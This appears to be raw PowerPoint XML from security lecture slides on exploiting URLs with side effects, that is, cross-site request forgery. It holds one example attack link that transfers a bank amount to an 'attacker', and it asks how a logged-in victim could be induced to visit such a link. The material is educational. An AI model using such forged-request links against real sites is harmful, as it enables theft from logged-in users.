            <a:endParaRPr sz="1765">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="object 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2375648" y="3703544"/>
            <a:ext cx="2294404" cy="366575"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="11185">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2382" spc="-18" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>What </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2382" spc="53" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>happens</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2382" spc="-31" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2382" spc="4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>if</a:t>
            </a:r>
            <a:endParaRPr sz="2382">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="object 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2381251" y="4254034"/>
            <a:ext cx="138673" cy="271613"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="11185">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1765" spc="287" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>•</a:t>
            </a:r>
            <a:endParaRPr sz="1765">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="object 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2381251" y="4756897"/>
            <a:ext cx="138673" cy="271613"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="11185">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1765" spc="287" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>•</a:t>
            </a:r>
            <a:endParaRPr sz="1765">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="76811" name="object 11"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2689412" y="4073338"/>
            <a:ext cx="7167563" cy="9970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12700">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:lnSpc>
                <a:spcPct val="136000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2382">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2382" b="1">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>user is logged in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2382">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>with an active session cookie  a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2382" b="1">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>request is issued for the above link?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2382">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="object 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2077291" y="5493684"/>
            <a:ext cx="140074" cy="271613"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="11185">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1765" spc="287" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>•</a:t>
            </a:r>
            <a:endParaRPr sz="1765">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="object 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2375647" y="5440456"/>
            <a:ext cx="5537107" cy="366575"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="11185">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2382" spc="18" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>How </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2382" spc="66" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>could </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2382" spc="13" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>you </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2382" spc="57" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>get </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2382" spc="13" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>a user </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2382" spc="9" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>to visit </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2382" spc="13" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>a</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2382" spc="-137" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2382" spc="-18" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>link?</a:t>
            </a:r>
            <a:endParaRPr sz="2382">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="object 14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2878512" y="1652868"/>
            <a:ext cx="6434978" cy="531979"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFF200"/>
          </a:solidFill>
          <a:ln w="3175">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="15659" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="33001">
              <a:spcBef>
                <a:spcPts val="124"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1677" spc="18" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>http://bank.com/transfer.cgi?amt=9999&amp;to=attacker</a:t>
            </a:r>
            <a:endParaRPr sz="1677">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="422657231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78449" y="191902"/>
            <a:ext cx="7433703" cy="611065"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr rtlCol="0"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="8766" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="3971" spc="18" dirty="0"/>
              <a:t>Exploiting </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="3971" spc="-63" dirty="0"/>
              <a:t>URLs </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="3971" spc="-4" dirty="0"/>
              <a:t>with</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="3971" spc="14" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="3971" spc="27" dirty="0"/>
              <a:t>side-effects</a:t>
            </a:r>
            <a:endParaRPr sz="3971"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="77827" name="object 3"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2795868" y="2608170"/>
            <a:ext cx="1294279" cy="1392331"/>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defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="77828" name="object 4"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2821081" y="2616574"/>
            <a:ext cx="1242453" cy="1339103"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId3"/>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defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="77829" name="object 5"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2801471" y="2616574"/>
            <a:ext cx="1243853" cy="1339103"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 0 w 1821814"/>
              <a:gd name="T1" fmla="*/ 0 h 1905000"/>
              <a:gd name="T2" fmla="*/ 2991 w 1821814"/>
              <a:gd name="T3" fmla="*/ 0 h 1905000"/>
              <a:gd name="T4" fmla="*/ 2991 w 1821814"/>
              <a:gd name="T5" fmla="*/ 6483 h 1905000"/>
              <a:gd name="T6" fmla="*/ 0 w 1821814"/>
              <a:gd name="T7" fmla="*/ 6483 h 1905000"/>
              <a:gd name="T8" fmla="*/ 0 w 1821814"/>
              <a:gd name="T9" fmla="*/ 0 h 1905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21814" h="1905000">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="1821230" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1821230" y="1905000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="1905000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="009CFD">
              <a:alpha val="50195"/>
            </a:srgbClr>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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="object 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3053603" y="3151655"/>
            <a:ext cx="890868" cy="258084"/>
